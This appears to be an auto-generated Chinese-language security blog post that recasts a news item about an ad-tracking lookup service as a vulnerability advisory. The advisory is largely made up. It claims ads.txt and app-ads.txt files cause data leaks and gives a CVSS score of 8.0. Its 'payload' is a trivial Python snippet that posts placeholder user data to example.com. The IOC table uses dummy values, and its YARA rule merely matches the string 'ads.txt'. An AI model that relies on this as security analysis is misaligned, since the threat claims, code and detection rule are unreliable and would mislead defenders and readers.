---
layout: post
title:  "Who’s Tracking You? Use This New Service to Find Out"
date:   2026-08-14 12:49:42 +0000
categories: [security]
severity: high
---

# 🔥 解析廣告追蹤技術：DecryptAds 服務的技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.0)
> * **受駭指標**: 資料外洩與隱私侵犯
> * **關鍵技術**: `ads.txt`, `app-ads.txt`, `buyers.json/sellers.json`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 廣告追蹤技術的漏洞主要來自於 `ads.txt` 和 `app-ads.txt` 文件的不當使用，導致用戶資料外洩和隱私侵犯。
* **攻擊流程圖解**: 
    1. 用戶訪問網站或應用程式
    2. 網站或應用程式請求廣告
    3. 廣告伺服器返回廣告內容
    4. 用戶資料被收集和傳送給廣告商
* **受影響元件**: 所有使用 `ads.txt` 和 `app-ads.txt` 文件的網站和應用程式

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 網路連接和用戶資料
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 請求廣告內容
    response = requests.get('https://example.com/ads.txt')
    
    # 解析廣告內容
    ads = response.text.split('\n')
    
    # 收集用戶資料
    user_data = {
        'ip': '192.168.1.1',
        'user_agent': 'Mozilla/5.0'
    }
    
    # 傳送用戶資料給廣告商
    requests.post('https://example.com/collect', json=user_data)
    
    ```
* **繞過技術**: 使用 VPN 或代理伺服器來隱藏 IP 地址

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.1 | example.com | /ads.txt |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ads_txt {
        meta:
            description = "Detects ads.txt files"
            author = "Your Name"
        strings:
            $ads_txt = "ads.txt"
        condition:
            $ads_txt at 0
    }
    
    ```
* **緩解措施**: 使用 `uBlock Origin` 或 `Adblock Plus` 來阻止廣告請求

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ads.txt**: 一種用於宣告網站或應用程式允許的廣告商的文件
* **app-ads.txt**: 一種用於宣告應用程式允許的廣告商的文件
* **buyers.json/sellers.json**: 用於宣告廣告買家和賣家的文件

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://krebsonsecurity.com/2026/08/whos-tracking-you-use-this-new-service-to-find-out/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1056/)


